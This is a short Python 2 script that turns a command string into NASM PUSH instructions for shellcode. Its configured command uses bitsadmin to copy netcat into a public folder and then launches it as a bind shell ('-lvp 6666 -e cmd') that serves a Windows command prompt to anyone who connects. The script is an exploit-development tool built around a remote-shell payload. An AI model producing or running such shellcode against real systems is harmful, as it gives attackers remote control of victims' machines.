#CREATE THE NASM INSTRUCTION TO PUSH A STRING INTO THE STACK

#TO BE CONFIGURED
line = 'cmd /c bitsadmin.exe /transfer 11 C:\\Users\\fbersani\\Desktop\\netcat\\nc.exe C:\\Users\\Public\\Downloads\\nc1.exe & C:\\Users\\Public\\Downloads\\nc1.exe -lvp 6666 -e cmd'

print "Command string is [" + line + "]"
print "Length " + str(len(line))
line = line[::-1]
if(len(line)%4==0):
	print "ok, stack aligned"
else:
	print "KO, STACK NOT ALIGNED"
print "\n"
n = 4
chunks = [line[i:i+n] for i in range(0, len(line), n)]
for i, val in enumerate(chunks):
	print "PUSH 0x" + val.encode('hex')

